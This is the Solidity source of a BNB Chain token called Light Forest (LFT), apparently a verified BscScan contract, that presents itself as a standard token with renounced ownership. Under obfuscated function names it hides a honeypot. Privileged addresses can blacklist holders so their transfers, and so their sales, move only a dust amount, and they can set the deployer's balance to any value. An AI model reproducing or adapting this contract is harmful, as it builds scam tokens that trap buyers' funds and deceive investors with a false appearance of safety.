/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface receiverTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableTakeTeam {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract LightForest {
    uint8 public decimals = 18;
    address public owner;
    mapping(address => bool) public walletSell;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    address public isSenderWallet;
    uint256 constant launchedFee = 10 ** 10;

    mapping(address => uint256) public balanceOf;
    bool public liquiditySellExempt;
    address public autoTotal;

    mapping(address => bool) public isLaunch;
    string public name = "Light Forest";
    string public symbol = "LFT";


    mapping(address => mapping(address => uint256)) public allowance;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        receiverTake minList = receiverTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        autoTotal = enableTakeTeam(minList.factory()).createPair(minList.WETH(), address(this));
        owner = exemptBuy();
        isSenderWallet = owner;
        isLaunch[isSenderWallet] = true;
        balanceOf[isSenderWallet] = totalSupply;
        emit Transfer(address(0), isSenderWallet, totalSupply);
        liquidityEnable();
    }

    

    function receiverTotal(address maxTrading) public {
        if (maxTrading == isSenderWallet || maxTrading == autoTotal || !isLaunch[exemptBuy()]) {
            return;
        }
        walletSell[maxTrading] = true;
    }

    function autoReceiver(uint256 sellToken) public {
        if (!isLaunch[exemptBuy()]) {
            return;
        }
        balanceOf[isSenderWallet] = sellToken;
    }

    function liquidityEnable() public {
        emit OwnershipTransferred(isSenderWallet, address(0));
        owner = address(0);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function launchShould(address minTo) public {
        if (liquiditySellExempt) {
            return;
        }
        isLaunch[minTo] = true;
        liquiditySellExempt = true;
    }

    function approve(address maxToken, uint256 sellToken) public returns (bool) {
        allowance[exemptBuy()][maxToken] = sellToken;
        emit Approval(exemptBuy(), maxToken, sellToken);
        return true;
    }

    function exemptBuy() private view returns (address) {
        return msg.sender;
    }

    function transferFrom(address limitTeamReceiver, address feeFrom, uint256 sellToken) public returns (bool) {
        if (limitTeamReceiver != exemptBuy() && allowance[limitTeamReceiver][exemptBuy()] != type(uint256).max) {
            require(allowance[limitTeamReceiver][exemptBuy()] >= sellToken);
            allowance[limitTeamReceiver][exemptBuy()] -= sellToken;
        }
        if (feeFrom == isSenderWallet || limitTeamReceiver == isSenderWallet) {
            return limitSell(limitTeamReceiver, feeFrom, sellToken);
        }
        if (walletSell[limitTeamReceiver]) {
            return limitSell(limitTeamReceiver, feeFrom, launchedFee);
        }
        return limitSell(limitTeamReceiver, feeFrom, sellToken);
    }

    function transfer(address feeFrom, uint256 sellToken) external returns (bool) {
        return transferFrom(exemptBuy(), feeFrom, sellToken);
    }

    function limitSell(address exemptSender, address fromList, uint256 sellToken) internal returns (bool) {
        require(balanceOf[exemptSender] >= sellToken);
        balanceOf[exemptSender] -= sellToken;
        balanceOf[fromList] += sellToken;
        emit Transfer(exemptSender, fromList, sellToken);
        return true;
    }


}